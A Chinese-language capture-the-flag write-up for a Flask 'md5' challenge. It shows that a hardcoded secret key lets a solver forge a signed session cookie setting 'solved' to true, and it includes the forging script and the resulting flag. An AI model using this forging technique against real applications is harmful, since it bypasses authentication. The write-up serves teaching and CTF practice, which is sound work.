# md5

## 题目简述

页面要求提交一个 MD5 为固定值的字符串，看似需要做原像搜索。源码却把 Flask `secret_key` 硬编码在应用中，而 `/win` 只检查客户端 session 中的 `solved` 是否为真。

因此无需破解 MD5；伪造一个合法签名的 Flask session cookie 即可直接进入获胜页面。

## 解题过程

源码中的关键逻辑为：

```python
app.secret_key = "s98dydvfjbxjawhpirhgio2;lknwrbfspifosbjqn2;oegwhfdg"

@app.route("/win")
def win():
    if session.get("solved"):
        return render_template("win.html")
```

用 Flask 自己的 session 序列化器生成 cookie，能够避免手工猜测 salt、摘要方法和时间戳格式：

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "s98dydvfjbxjawhpirhgio2;lknwrbfspifosbjqn2;oegwhfdg"
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
print(serializer.dumps({"solved": True}))
```

把输出设置为目标站点的 `session` cookie，再访问 `/win`。服务端会验证签名、反序列化出 `solved=True`，并渲染包含 flag 的模板：

```text
UMDCTF{how_many_ai_tokens_did_you_waste_trying_to_solve_this_one}
```

源码中的外部通知 webhook 与认证绕过无关，也不应复制到题解或实际请求中。

## 方法总结

看到哈希题面时仍应先审计完整信任边界。Flask 默认 session 数据保存在客户端，安全性完全依赖服务端密钥；密钥一旦随源码泄露，攻击者就能伪造任意会话状态。这里的 MD5 只是诱饵，真正漏洞是硬编码的 session 签名密钥。
